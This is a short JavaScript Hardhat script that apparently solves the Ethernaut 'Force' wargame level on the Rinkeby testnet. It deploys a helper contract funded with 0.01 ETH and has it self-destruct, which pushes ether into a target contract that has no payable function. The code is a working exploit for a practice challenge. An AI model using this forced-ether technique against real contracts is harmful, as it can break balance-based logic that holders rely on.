const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0xFCdD8B09CD3614620851E78f6691eD469f90AcF5'
const abi = []

async function hack(contract, signer) {
    // You can't send ether to a contract directly without a payable function.
    // However, when a contract selfdestructs, it can send its funds anywhere, no matter what.

    // Create a Forcer contract and send it 0.01 ETH upon construction.
    const Forcer = await ethers.getContractFactory("Forcer");
    const forcer = await Forcer.deploy(contract.address, {value: ethers.utils.parseEther('0.01')});
    await forcer.deployed();
    console.log("Forcer Deployed To:", forcer.address);

    const provider = ethers.getDefaultProvider('rinkeby');
    const balance = await provider.getBalance(forcer.address);
    console.log(`Forcer Balance: ${ethers.utils.formatEther(balance)} ETH`);

    // Selfdestruct the Forcer contract and send its funds to the target contract.
    const tx = await forcer.force();
    await tx.wait();
    const balance2 = await provider.getBalance(contract.address);
    console.log(`Contract Balance: ${ethers.utils.formatEther(balance2)} ETH`);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})